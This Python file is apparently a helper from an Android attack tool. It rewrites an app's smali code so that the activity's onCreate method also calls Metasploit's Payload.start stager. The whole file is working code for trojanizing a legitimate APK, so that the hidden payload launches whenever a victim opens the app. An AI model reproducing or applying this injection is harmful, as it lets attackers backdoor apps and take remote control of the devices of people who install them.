import errno
import os



def generate_hooked_smali(smali_path):
    """
        Create the hooked smali.
        Note that smali_path points to the file with the original smali code
    """
    #read smali file
    activity_smali = []
    with open(smali_path) as f:
        activity_smali.extend(f.readlines())

    # change smali file in order to insert the hook
    # replace comment for launchin activity with payload
    activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
    payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"

    return [line.replace(activitycreate, payloadhook) for line in activity_smali]
